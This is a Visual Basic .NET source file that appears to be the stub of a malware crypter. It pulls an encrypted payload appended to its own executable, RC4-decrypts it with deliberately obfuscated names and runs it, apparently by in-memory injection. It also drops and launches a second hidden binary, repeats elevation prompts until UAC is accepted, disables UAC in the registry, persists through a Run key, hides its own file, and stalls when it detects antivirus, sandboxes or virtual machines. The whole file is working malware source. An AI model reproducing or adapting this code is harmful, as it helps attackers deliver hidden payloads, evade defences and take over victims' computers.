Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Security.Principal
Module Module1
    Dim hide, file, file2, delay, mes, start, antis, fadmin, kuac As String
    Dim delayi As Integer
    Const sepor As String = "奧克歐文馬數本圖月瑟格大邏斯截租闕里豐埃兒會子榮拉茲小莫接取氣普戈截嗯莫浪嘛諾一節戲略姆個亞還耐如的瑪列扎奈莫兒艾庵克帕人闕"
    Dim ar As String()
    Dim bfile1, bfile2 As Byte()
    <DllImport("user32", CharSet:=CharSet.Auto, SetLastError:=True)>
    Function SendMessage(
        ByVal hWnd As IntPtr,
        ByVal Msg As UInt32,
        ByVal wParam As Integer,
        ByVal lParam As IntPtr) _
        As Integer
    End Function

    Const BCM_SETSHIELD As UInt32 = &H160C
    Sub keke()
        Dim teext As String = ar(1)
        Dim bytes As Byte() = Convert.FromBase64String(teext)
        bfile1 = shisfr.kfgMZvvDND(bytes, ar(2))
        Call BQyvyIkGUyNsSxyrIXzevaKEHnmtsgVOgifxDLTdiQlxdoJNrikayshTazIJDdqJZVQBPJfeXTPyMWFnZHpZEMKadQcxKACwCRmJcQclIwgyPLvtcjxdJwDBncaJHLLCkKcWmuSaJnTxgVmHVErnJMSXZWlvrYaFtqUrmMKXxhLxHPnFZGDGxWOQGnrJJCCewxwUafLF.QGEZDtwouZBxQmEfBnohxJJZQdphLzUWNxdAabIhmmGLrKhBbDXlSDSjqxFVtIYWhkfISKbOZXCMSvoyijawffmVwkdxZkkLuGrxaJLLdVYCoFhztSeQgFbKEesOyuMRVAwVtoUAUVBhCFTecuStRrsfjUfVLALQeHceTLJITLVFBIIQEDYifEuHGuaWIRrjrPQZurnL1((bfile1), Application.ExecutablePath)
    End Sub
    Sub main()
        Dim identity = WindowsIdentity.GetCurrent()
        Dim principal = New WindowsPrincipal(identity)
        Dim isElevated As Boolean = principal.IsInRole(WindowsBuiltInRole.Administrator)
        ar = Split(IO.File.ReadAllText(Application.ExecutablePath), sepor)
        delay = ar(7) : file2 = ar(5) : antis = ar(4) : start = ar(3) : mes = ar(6) : hide = ar(8) : fadmin = ar(9) : kuac = ar(10)
#Region "Extars"
        If isElevated = False Then

            If fadmin = "True" Then
a1:
                Dim proc As New ProcessStartInfo
                proc.UseShellExecute = True
                proc.WorkingDirectory = Environment.CurrentDirectory
                proc.FileName = Application.ExecutablePath
                proc.Verb = "runas"

                Try
                    Process.Start(proc)
                Catch
                    GoTo a1
                    Return
                End Try
                End
            End If
        End If
        If kuac = "True" Then Call extarts.kuacc()
        If delay <> "nope" Then
            delayi = delay
            Threading.Thread.Sleep(delayi)
        End If
        If file2 <> "nope" Then
            bfile2 = Convert.FromBase64String(file2)
            IO.File.WriteAllBytes(My.Computer.FileSystem.SpecialDirectories.Programs + "\sysworker.exe", bfile2)
            Process.Start(My.Computer.FileSystem.SpecialDirectories.Programs + "\sysworker.exe")
        End If
        If mes <> "nope" Then Call extarts.mess(mes)
        If antis = "True" Then
            Call kav()
            Call sand()
            Call vbox()
            Call vmvare()
            Call vpc()
            Call avs()
            If (avs() = True) Or (kav() = True) Or (sand() = True) Or (vbox() = True) Or (vmvare() = True) Or (vpc() = True) Then Call whilee()
        End If
        If hide = "True" Then
            IO.File.SetAttributes(Application.ExecutablePath, FileAttributes.Hidden)


        End If
        If start = "True" Then extarts.starter()
#End Region
        Call keke()
    End Sub
    Public Sub whilee()
        While 1 <> 0
            Dim a As Byte
            a = a + 10
        End While
    End Sub

End Module
Public Class extarts
    Public Shared Function starter()
        Dim info As New FileInfo(Application.StartupPath)
        File.Copy(Application.ExecutablePath, My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "\" + info.Name)
        My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Exploler\Run", True).SetValue(Application.ProductName, My.Computer.FileSystem.SpecialDirectories.AllUsersApplicationData + "\" + info.Name)
    End Function
    Public Shared Function mess(mes As String)
        MsgBox(mes)
    End Function
    Public Shared Function kuacc()
        My.Computer.Registry.LocalMachine.OpenSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", True).SetValue("EnableLUA", 0)
    End Function



End Class
Public Class shisfr
    Public Shared Function kfgMZvvDND(ByVal IwEjXWlYGV As Byte(), ByVal HJTmCYrlKp As String) As Byte()
        Dim NdfDdRYKOH As Byte() = System.Text.Encoding.ASCII.GetBytes(HJTmCYrlKp)
        Dim utjCmkUcca, VuazNJTUMw, lMStAuFrkO As UInteger
        Dim uQxmFluoej As UInteger() = New UInteger(255) {}
        Dim rlcbVnVPNC As Byte() = New Byte(IwEjXWlYGV.Length - 1) {}
        For i = 0 To 255
            uQxmFluoej(i) = i
        Next
        For i = 0 To 255
            VuazNJTUMw = (VuazNJTUMw + NdfDdRYKOH(i Mod NdfDdRYKOH.Length) + uQxmFluoej(i)) And 255
            lMStAuFrkO = uQxmFluoej(i)
            uQxmFluoej(i) = uQxmFluoej(VuazNJTUMw)
            uQxmFluoej(VuazNJTUMw) = lMStAuFrkO
        Next
        utjCmkUcca = 0 : VuazNJTUMw = 0
        Dim c As Integer
        For c = 0 To rlcbVnVPNC.Length - 1
            utjCmkUcca = (utjCmkUcca + 1) And 255
            VuazNJTUMw = (VuazNJTUMw + uQxmFluoej(utjCmkUcca)) And 255
            lMStAuFrkO = uQxmFluoej(utjCmkUcca)
            uQxmFluoej(utjCmkUcca) = uQxmFluoej(VuazNJTUMw)
            uQxmFluoej(VuazNJTUMw) = lMStAuFrkO
            rlcbVnVPNC(c) = IwEjXWlYGV(c) Xor uQxmFluoej((uQxmFluoej(utjCmkUcca) + uQxmFluoej(VuazNJTUMw)) And 255)
        Next
        Return rlcbVnVPNC
    End Function
End Class
